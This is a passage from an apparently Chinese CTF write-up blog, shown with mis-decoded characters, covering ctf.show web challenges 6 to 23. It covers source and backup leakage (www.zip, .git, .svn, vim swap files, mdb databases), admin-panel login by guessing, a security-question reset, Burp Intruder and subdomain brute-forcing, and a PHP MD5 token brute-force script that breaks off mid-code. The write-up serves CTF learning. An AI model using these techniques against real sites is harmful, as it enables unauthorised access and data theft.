<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web5/XL%7D%60G7X%5BG1ZPH%60HYCE__%40%7DR.png" alt=""></p>
<h3 id="web6"><a class="header-anchor" href="#web6">Â¶</a>web6</h3>
<p>é¢˜ç›®æç¤ºwww.zipæºç æ³„éœ²ï¼Œäºæ˜¯æ„é€ urlè®¿é—®ä¸‹è½½å‹ç¼©åŒ…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;da7afaa3-8d2b-4ae3-aa90-a0945c88ba15.chall.ctf.show&#x2F;www.zip</span><br></pre></td></tr></table></figure>
<p>åœ¨å‹ç¼©åŒ…ä¸­æœ‰ä¸€ä¸ªfl000g.txtæ–‡ä»¶ï¼Œæ‰“å¼€å†…å®¹ä¸ºï¼šflag{flag_here}ï¼Œæœ¬æ¥ä»¥ä¸ºè¿™æ˜¯flagï¼Œç„¶åæäº¤é”™è¯¯äº†ã€‚æ¥ç€è®¿é—®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;da7afaa3-8d2b-4ae3-aa90-a0945c88ba15.chall.ctf.show&#x2F;fl000g.txt</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°æ­£ç¡®çš„flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web6/%29%29EZQI_I6W%60%25OY7_%28GGJI%5B9.png" alt=""></p>
<h3 id="web7"><a class="header-anchor" href="#web7">Â¶</a>web7</h3>
<p>æ ¹æ®æç¤ºï¼Œæ˜¯ä¸ªgitæ³„éœ²é—®é¢˜ï¼Œè®¿é—®.git/index.phpå³å¯ï¼Œå³æ„é€ urlå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e85f4c26-faf9-4ace-a049-4f1b4587ad44.chall.ctf.show&#x2F;.git&#x2F;index.php</span><br></pre></td></tr></table></figure>
<p>è®¿é—®åå°±èƒ½å¾—åˆ°flag</p>
<h3 id="web8"><a class="header-anchor" href="#web8">Â¶</a>web8</h3>
<p>æ ¹æ®æç¤ºï¼Œæœ¬é¢˜è€ƒæŸ¥çš„æ˜¯svnæ³„éœ²</p>
<blockquote>
<p>SVNï¼ˆsubversionï¼‰æ˜¯æºä»£ç ç‰ˆæœ¬ç®¡ç†è½¯ä»¶ã€‚ åœ¨ä½¿ç”¨SVNç®¡ç†æœ¬åœ°ä»£ç è¿‡ç¨‹ä¸­ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªéšè—æ–‡ä»¶å¤¹ï¼Œå…¶ä¸­åŒ…å«é‡è¦çš„æºä»£ç ä¿¡æ¯ã€‚ä½†ä¸€äº›ç½‘ç«™ç®¡ç†å‘˜åœ¨å‘å¸ƒä»£ç æ—¶ï¼Œä¸æ„¿æ„ä½¿ç”¨â€˜å¯¼å‡ºâ€™åŠŸèƒ½ï¼Œè€Œæ˜¯ç›´æ¥å¤åˆ¶ä»£ç æ–‡ä»¶å¤¹åˆ°WEBæœåŠ¡å™¨ä¸Šï¼Œè¿™å°±ä½¿éšè—æ–‡ä»¶å¤¹è¢«æš´éœ²äºå¤–ç½‘ç¯å¢ƒï¼Œè¿™ä½¿å¾—æ¸—é€å·¥ç¨‹å¸ˆå¯ä»¥å€ŸåŠ©å…¶ä¸­åŒ…å«ç‰ˆæœ¬ä¿¡æ¯è¿½è¸ªçš„ç½‘ç«™æ–‡ä»¶ï¼Œé€æ­¥æ‘¸æ¸…ç«™ç‚¹ç»“æ„ã€‚ åœ¨æœåŠ¡å™¨ä¸Šå¸ƒç½²ä»£ç æ—¶ã€‚å¦‚æœæ˜¯ä½¿ç”¨ svn checkout åŠŸèƒ½æ¥æ›´æ–°ä»£ç ï¼Œè€Œæ²¡æœ‰é…ç½®å¥½ç›®å½•è®¿é—®æƒé™ï¼Œåˆ™ä¼šå­˜åœ¨æ­¤æ¼æ´ã€‚é»‘å®¢åˆ©ç”¨æ­¤æ¼æ´ï¼Œå¯ä»¥ä¸‹è½½æ•´å¥—ç½‘ç«™çš„æºä»£ç ã€‚</p>
</blockquote>
<p>æˆ‘ä»¬æ„é€ urlè®¿é—®ï¼Œå³å¯è·å¾—flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;a79a4695-f024-44dd-af3e-4eb6c2720be7.chall.ctf.show&#x2F;.svn&#x2F;</span><br></pre></td></tr></table></figure>
<h3 id="web9"><a class="header-anchor" href="#web9">Â¶</a>web9</h3>
<p>æœ¬é¢˜è€ƒæŸ¥çš„æ˜¯vimçš„ç¼“å­˜æ³„éœ²</p>
<blockquote>
<p>vimç¼–è¾‘æ–‡æœ¬æ—¶ä¼šåˆ›å»ºä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œå¦‚æœç¨‹åºæ­£å¸¸é€€å‡ºï¼Œä¸´æ—¶æ–‡ä»¶è‡ªåŠ¨åˆ é™¤ï¼Œå¦‚æœæ„å¤–é€€å‡ºå°±ä¼šä¿ç•™ï¼Œå½“vimå¼‚å¸¸é€€å‡ºåï¼Œå› ä¸ºæœªå¤„ç†ç¼“å­˜æ–‡ä»¶ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡ç¼“å­˜æ–‡ä»¶æ¢å¤åŸå§‹æ–‡ä»¶å†…å®¹ã€‚è€Œæœ¬é¢˜çš„æƒ…æ™¯å°±æ˜¯ç”µè„‘æ­»æœºäº†æ„å¤–é€€å‡ºï¼Œå¯¼è‡´å­˜åœ¨ä¸´æ—¶æ–‡ä»¶</p>
</blockquote>
<p>æ„é€ urlå¦‚ä¸‹ï¼Œä¸‹è½½.swpåç¼€ç»“å°¾çš„æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0b4ba9f5-92a1-42fa-ba28-49cff3f8400e.chall.ctf.show&#x2F;index.php.swp</span><br></pre></td></tr></table></figure>
<p>æ‰“å¼€æ–‡ä»¶å³å¯è·å–flag</p>
<h3 id="web10"><a class="header-anchor" href="#web10">Â¶</a>web10</h3>
<p>é¢˜ç›®æç¤ºcookieï¼Œç„¶åæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹è¯·æ±‚å¤´ï¼Œå‘ç°cookieæ•°æ®ä¸ºflag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web10/5%5BL%7B~%7BV%24%245%254B7%5D67~%29B5CX.png" alt=""><br>
æˆ‘ä»¬è§£ä¸€ä¸‹urlç¼–ç ï¼Œå¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web10/%5DCN%2579K%24A9%280%24%60%240_TOFG%28E.png" alt=""></p>
<h3 id="web11"><a class="header-anchor" href="#web11">Â¶</a>web11</h3>
<p>æ ¹æ®æç¤ºï¼ŒæŸ¥è¯¢å¯¹ctfshowåŸŸåè¿›è¡ŒdnsæŸ¥è¯¢ï¼ŒæŸ¥çœ‹TXTè®°å½•<br>
é˜¿é‡Œäº‘æŸ¥è¯¢é“¾æ¥ï¼š<a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web11/RDP905P_SOZF0HM725N3%7DJV.png" alt=""><br>
è·å–flagæˆåŠŸ</p>
<h3 id="web12"><a class="header-anchor" href="#web12">Â¶</a>web12</h3>
<p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œæˆ‘ä»¬è®¿é—®robots.txtï¼Œè·å–åˆ°åå°åœ°å€<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web12/%24%24%28H%2954_BF%5DPS%7B06RN_M%7B7O.png" alt=""><br>
ç„¶åæˆ‘ä»¬è®¿é—®ä¸€ä¸‹åå°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;c25a456d-63f7-497e-9170-0365a9cdce53.chall.ctf.show&#x2F;admin&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web12/3UKIBC9YJVM%40%7D6V%29O%28LT%291G.png" alt=""><br>
è´¦å·åç›´æ¥ç›²çŒœadminï¼Œå¯†ç æ˜¯ç½‘ç«™åº•éƒ¨çš„è¿™ä¸²æ•°å­—ï¼Œ372619038<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web12/ZIA0BV2O2KFNIR~5%24%282T2DN.png" alt=""><br>
ç™»å½•è¿›æ¥åï¼Œè·å–åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web12/OD2%603%24A%4083R%5BL%287A%5DGC%24Z%5B2.png" alt=""></p>
<h3 id="web13"><a class="header-anchor" href="#web13">Â¶</a>web13</h3>
<p>åœ¨ç½‘ç«™æ‰¾åˆ°ä¸€ä¸ªè¶…é“¾æ¥<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web13/JDUYP_%7D%24%24HV%5B%7BUGOENSK%7BLB.png" alt=""><br>
è®¿é—®åï¼Œå‘ç°å¼€å‘è€…åœ¨æ–‡æ¡£ä¸­å†™äº†è‡ªå·±çš„åå°åœ°å€å’Œè´¦å·å¯†ç <br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web13/Q%25%25%40CO8%29ZM%40M1%29_%7BMLDU6P6.png" alt=""><br>
è¿™é‡ŒæŠŠyour-domainæ¢æˆè‡ªå·±çš„åšé¢˜ç¯å¢ƒï¼Œè®¿é—®åå°åœ°å€</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e63907cd-33af-4c57-b605-4f7e04928e43.chall.ctf.show&#x2F;system1103&#x2F;login.php</span><br></pre></td></tr></table></figure>
<p>è¾“å…¥è´¦å·å’Œå¯†ç åå¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web13/1G7F~2%7D~NO048WQL%5D1LFUTR.png" alt=""></p>
<h3 id="web14"><a class="header-anchor" href="#web14">Â¶</a>web14</h3>
<p>æ‰“å¼€ç½‘ç«™ï¼Œæ ¹æ®æç¤ºè®¿é—®<code>http://4696e930-9cb3-47fd-a00b-c671f82fe4a4.chall.ctf.show/editor/</code><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web14/Y%5B8CN%60PAKNL%7BV%25SICU%60LH56.png" alt=""><br>
çœ‹åˆ°ä¸€ä¸ªç¼–è¾‘å™¨ï¼Œåœ¨flashçš„ä¸Šä¼ ä¸­ï¼Œå‘ç°æœ‰ä¸ªæ–‡ä»¶ç©ºé—´<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web14/617KH%5BRRFKY%5D4L%5BI%5DW~UXA3.png" alt=""><br>
ç‚¹å‡»æ–‡ä»¶ç©ºé—´ï¼Œå‘ç°çˆ†å‡ºäº†ç›®å½•<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web14/%25U17ETN4D42GP3~TG%7D%25N3M8.png" alt=""><br>
æ‰¾äº†æ‰¾ï¼Œflagåœ¨var/www/html/nothinghere/fl000g.txtä¸­ï¼Œäºæ˜¯æ„é€ urlè®¿é—®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;4696e930-9cb3-47fd-a00b-c671f82fe4a4.chall.ctf.show&#x2F;nothinghere&#x2F;fl000g.txt</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web14/%60_%28G6DSOG5TBQLZLDH08F7V.png" alt=""></p>
<h3 id="web15"><a class="header-anchor" href="#web15">Â¶</a>web15</h3>
<p>æ ¹æ®é¢˜ç›®æç¤ºé‚®ç®±ï¼Œåœ¨ç½‘é¡µåº•éƒ¨å‘ç°ä¸€ä¸ªé‚®ç®±<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web15/HK_MLVPS3%246282SAV6YPFIM.png" alt=""><br>
å†urlåé¢åŠ ä¸Šadminè®¿é—®ä¸€ä¸‹åå°<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web15/VFRR%5DS8%60%60%7DV7%5D%251%25_2QAGS7.png" alt=""><br>
æœ‰ä¸€ä¸ªå¿˜è®°å¯†ç é€‰é¡¹ï¼Œç‚¹å‡»ä¸€ä¸‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web15/%24OSUPYKMZZOORSX80VE63S2.png" alt=""><br>
æœ‰å¯†ä¿é—®é¢˜ï¼Œè”æƒ³åˆ°qqé‚®ç®±ï¼Œæœç´¢ä¸€ä¸‹qq<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web15/8%24BYJYK%5B7%251M3N0TF%60F%60VK2.png" alt=""><br>
å¾—åˆ°åœ°å€ä¸ºè¥¿å®‰ï¼Œäºæ˜¯æäº¤è¥¿å®‰<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web15/I%5D%5B9%7BXDD98TS%5BMO%5DB%28_%7B%29%60P.png" alt=""><br>
å¾—åˆ°å¯†ç ä¸ºadmin7789ï¼Œè´¦å·è¿˜æ˜¯adminï¼Œç™»å½•åè·å¾—flag</p>
<h3 id="web16"><a class="header-anchor" href="#web16">Â¶</a>web16</h3>
<p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œå­˜åœ¨æ¢é’ˆ</p>
<blockquote>
<p>phpæ¢é’ˆæ˜¯ç”¨æ¥æ¢æµ‹ç©ºé—´ã€æœåŠ¡å™¨è¿è¡ŒçŠ¶å†µå’ŒPHPä¿¡æ¯ç”¨çš„ï¼Œæ¢é’ˆå¯ä»¥å®æ—¶æŸ¥çœ‹æœåŠ¡å™¨ç¡¬ç›˜èµ„æºã€å†…å­˜å ç”¨ã€ç½‘å¡æµé‡ã€ç³»ç»Ÿè´Ÿè½½ã€æœåŠ¡å™¨æ—¶é—´ç­‰ä¿¡æ¯ã€‚æ˜¯ä¸€ä¸ªæŸ¥çœ‹æœåŠ¡å™¨ä¿¡æ¯çš„å·¥å…·ã€‚<br>
æ¯”å¦‚æŸ¥çœ‹æœåŠ¡å™¨æ”¯æŒä»€ä¹ˆï¼Œä¸æ”¯æŒä»€ä¹ˆï¼Œç©ºé—´é€Ÿåº¦ç­‰ç­‰çŠ¶å†µï¼</p>
</blockquote>
<p>äºæ˜¯è®¿é—®<code>http://e42c0d7a-d052-485d-bb09-a7c68a6d0214.chall.ctf.show/tz.php</code><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web16/CL_7ZWZ3%24~0%7D3D0Q1PPD86H.png" alt=""><br>
å†ç‚¹å‡»phpinfoæŸ¥çœ‹ä¿¡æ¯<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web16/_NM4E%5B4%60TFQ%7DPP%60%240P2A~72.png" alt=""><br>
åœ¨é¡µé¢æœç´¢ä¸€ä¸‹ctfshowï¼Œå³å¯å¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web16/MK%7B%28X5DI52%29LVAPG%7D%7BTJSQE.png" alt=""></p>
<h3 id="web17"><a class="header-anchor" href="#web17">Â¶</a>web17</h3>
<p>æ ¹æ®é¢˜ç›®ï¼ŒæŸ¥æ‰¾ctfer.comçš„çœŸå®ipï¼Œäºæ˜¯ç”¨fofaæŸ¥æ‰¾<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web17/%7BE3HVN%5DBT7C7%7BR%29_G%7DL%29ODI.png" alt=""><br>
æŸ¥åˆ°ipåœ°å€ä¸ºï¼š111.231.70.44ï¼Œæ‰€ä»¥flagä¸ºï¼šflag{111.231.70.44}</p>
<h3 id="web18"><a class="header-anchor" href="#web18">Â¶</a>web18</h3>
<p>æ‰“å¼€æ˜¯ä¸€ä¸ªæ¸¸æˆï¼Œæˆ‘ä»¬å»æ‰¾æ‰¾å®ƒçš„æ–‡ä»¶ï¼Œåœ¨jsä¸­å‘ç°äº†å½“åˆ†æ•°å¤§äº100æ—¶ï¼Œèµ‹å€¼çš„ä¸€ä¸²ç¼–ç <br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web18/_%60NIPJPH%606XG7%7BHCOPOJMWC.png" alt=""><br>
æˆ‘ä»¬æ‹¿å»unicodeè§£ç ä¸€ä¸‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web18/WHIID%5B%5BUR1Y%5DOL_G0K7H%247G.png" alt=""><br>
æ ¹æ®æç¤ºï¼Œè®¿é—®110.phpï¼Œæ„é€ url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;884e39f8-376a-4d61-9618-ee22fecc3327.chall.ctf.show&#x2F;110.php</span><br></pre></td></tr></table></figure>
<p>è®¿é—®åå¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web18/%60OO6K~50K%60A%7B~0EC%24G%5D_52N.png" alt=""></p>
<h3 id="web19"><a class="header-anchor" href="#web19">Â¶</a>web19</h3>
<p>æ‰“å¼€æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œå³é”®æŸ¥çœ‹ä¸€ä¸‹æºç <br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web19/_KY%7DOY%5BDG6ICR%5DH9U~N%600%28E.png" alt=""><br>
æ ¹æ®phpæºç ï¼Œæˆ‘ä»¬éœ€è¦postå‘é€ç”¨æˆ·åå’Œå¯†ç è¿‡å»</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å½“ç”¨æˆ·åä¸ºadmin</span><br><span class="line">å¯†ç ä¸ºa599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</span><br><span class="line">å³å¯è¾“å‡ºflag</span><br></pre></td></tr></table></figure>
<p>æ„é€ å‘é€postè¯·æ±‚<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web19/%5DK48MGWOC%243%2555U6R%28YHEWA.png" alt=""><br>
æˆåŠŸè·å–flag</p>
<h3 id="web20"><a class="header-anchor" href="#web20">Â¶</a>web20</h3>
<p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œæ˜¯mdbæ–‡ä»¶æ³„éœ²</p>
<blockquote>
<p>mdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶</p>
</blockquote>
<p>äºæ˜¯æˆ‘ä»¬è®¿é—®/db/db.mdbï¼Œå³æ„é€ urlå¦‚ä¸‹è®¿é—®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;5c070a5e-3a51-4904-a668-4385dfa7e714.chall.ctf.show&#x2F;db&#x2F;db.mdb</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web20/A%60M~%5B%5B9GGXE8%7DAG4%7D%29V2~6H.png" alt=""><br>
ä¸‹è½½db.mdbæ–‡ä»¶åï¼Œç”¨è®°äº‹æœ¬æ‰“å¼€æœç´¢flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web20/G8QY%29JHUVWV%60KE%40MU9K%7BXOT.png" alt=""><br>
æˆåŠŸè·å–åˆ°flag</p>
<h2 id="çˆ†ç ´-21-28"><a class="header-anchor" href="#çˆ†ç ´-21-28">Â¶</a>çˆ†ç ´(21-28)</h2>
<h3 id="web21"><a class="header-anchor" href="#web21">Â¶</a>web21</h3>
<p>é¢˜ç›®ç»™äº†ä¸€ä¸ªzipæ–‡ä»¶ï¼Œæ‰“å¼€åè§£å‹æ˜¯çˆ†ç ´çš„å­—å…¸ï¼Œæˆ‘ä»¬æŠ“åŒ…ä¸€ä¸‹ç½‘å€çœ‹çœ‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/%7DJ%7BI5%243FC%5D0~HWVBF9YEZAA.png" alt=""><br>
å‘ç°è´¦å·å’Œå¯†ç éƒ½è¢«base64äº†ï¼Œæˆ‘ä»¬å‘é€åˆ°intruderæ¨¡å—ï¼Œç»™çˆ†ç ´çš„ä½ç½®åŠ ä¸Š$ç¬¦åœˆä½<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/CNNU1O4C%40XHK3Y5JORN%60Q1V.png" alt=""><br>
å»base64è§£ç ä¸€ä¸‹çœ‹çœ‹æ ¼å¼<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/XNGZCN%286QM%40%40S%40%29%5DCDH5810.png" alt=""><br>
æ ¼å¼æ˜¯è´¦å·:å¯†ç ï¼Œé‚£æˆ‘ä»¬ä½¿ç”¨custom iterator(è‡ªå®šä¹‰è¿­ä»£å™¨)æ¨¡å—ï¼Œé¦–å…ˆç¬¬ä¸€ä¸ªæ”¾è´¦å·admin<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/CVUBPQE_TDC%60%282%7BNFWNJN66.png" alt=""><br>
ç¬¬äºŒä¸ªæ”¾ç¬¦å·<code>:</code><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/EE%24R8%28LNP_D4TP6_LGD%40WBX.png" alt=""><br>
ç¬¬ä¸‰ä¸ªæ”¾é¢˜ç›®ç»™çš„å­—å…¸<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/YDJT6U%5B3%7B%7B%5BW3%24LTQU%40S2I7.png" alt=""><br>
æ¥ç€å†è¿›è¡Œbase64ç¼–ç ï¼Œè¿˜æœ‰æŠŠåé¢è¿™ä¸ªurlç¼–ç å­—ç¬¦æœ€å¥½å–æ¶ˆæ‰<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/BG65%608Y%28U%5D%5BZ_Z0Q9PIR%7B%40V.png" alt=""><br>
ç„¶åå°±æ˜¯attackå¼€å§‹çˆ†ç ´äº†<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/I%40HP%40S%299HT%5DREAIMIUYYV8K.png" alt=""><br>
çˆ†ç ´å‡ºå¯†ç ï¼ŒæˆåŠŸè·å¾—flag</p>
<h3 id="web22"><a class="header-anchor" href="#web22">Â¶</a>web22</h3>
<p>é¢˜ç›®è®©æˆ‘ä»¬å»çˆ†ç ´ctfer.comåŸŸåï¼Œä¹Ÿå°±æ˜¯å»çˆ†ç ´å­åŸŸåï¼Œç›´æ¥ä¸Šlayer<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web22/CNI3BQ%29BITHJIJ~2%7B6E%5DFC6.png" alt=""><br>
çˆ†ç ´å‡ºæœ‰flagçš„å­åŸŸåï¼Œè®¿é—®åå¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web22/WW7DID%7BTYG1US%60G6%244MWXJI.png" alt=""></p>
<h3 id="web23"><a class="header-anchor" href="#web23">Â¶</a>web23</h3>
<p>æ‰“å¼€çœ‹åˆ°phpæºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    $token = md5($_GET[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(substr($token, <span class="number">1</span>,<span class="number">1</span>)===substr($token, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr($token, <span class="number">14</span>,<span class="number">1</span>) ===substr($token, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((intval(substr($token, <span class="number">1</span>,<span class="number">1</span>))+intval(substr($token, <span class="number">14</span>,<span class="number">1</span>))+substr($token, <span class="number">17</span>,<span class="number">1</span>))/substr($token, <span class="number">1</span>,<span class="number">1</span>)===intval(substr($token, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>ä»£ç å®¡è®¡ä¸€ä¸‹ï¼Œè¾“å‡ºflagéœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶</p>
<blockquote>
<p>æ³¨æ„ï¼Œç¼–ç¨‹ä¸­æ˜¯ä»0ä¸ºä¸‹æ ‡å¼€å§‹ï¼Œç¬¬ä¸€ä½æ˜¯ç¬¬äºŒä¸ªæ•°å­—<br>
ç¬¬ä¸€ï¼Œä¼ å…¥çš„tokenå€¼ç»è¿‡md5åŠ å¯†åï¼Œç¬¬1ä½=ç¬¬14ä½å¹¶ä¸”ç¬¬14ä½=ç¬¬17ä½<br>
ç¬¬äºŒï¼Œç¬¬1ä½+ç¬¬14ä½+ç¬¬17ä½Ã·ç¬¬1ä½ç­‰äºç¬¬31ä½</p>
</blockquote>
<p>æ ¹æ®æºç æ”¹ä¸€ä¸‹ï¼Œå†™ä¸ªè„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Authorï¼šdota_st</span></span><br><span class="line"><span class="comment"> * Dateï¼š2021/2/2   10:48</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$dict = <span class="string">&quot;0123456789qwertyuiopasdfghjklzxcvbnm&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>;$i&lt; <span class="number">36</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>;$j&lt;<span class="number">36</span>;$j++)&#123;</span><br><span class="line">        $token = md5($dict[$i].$dict[$j]);</span><br><span class="line">        <span class="keyword">if</span>(substr($token, <span class="number">1</span>,<span class="number">1</span>)===substr($token, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr($token, <span class="number">14</span>,<span class="number">1</span>) ===substr($token, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>((intval(substr($token, <span class="number">1</span>,<span class="number">1</span>))+intval(substr($token, <span class="number">14</span>,<span class="number">1</span>))+substr($token, <span class="number">17</span>,<span 